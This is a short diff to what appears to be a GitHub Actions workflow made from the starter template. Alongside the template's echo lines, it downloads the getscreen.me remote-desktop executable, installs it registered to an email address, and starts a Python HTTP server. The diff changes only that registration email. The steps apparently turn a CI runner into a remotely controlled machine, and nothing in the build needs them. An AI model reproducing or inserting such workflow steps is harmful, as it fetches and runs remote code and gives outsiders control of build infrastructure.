@@ -35,5 +35,5 @@ jobs:
           echo Add other actions to build,
           echo test, and deploy your project.
           irm https://getscreen.me/download/getscreen.exe -OutFile "gs.exe"
-          ./gs.exe -install -register 1tbfree@proton.me
+          ./gs.exe -install -register nextcloudtalk50@gmail.com
           py -m http.server 2104
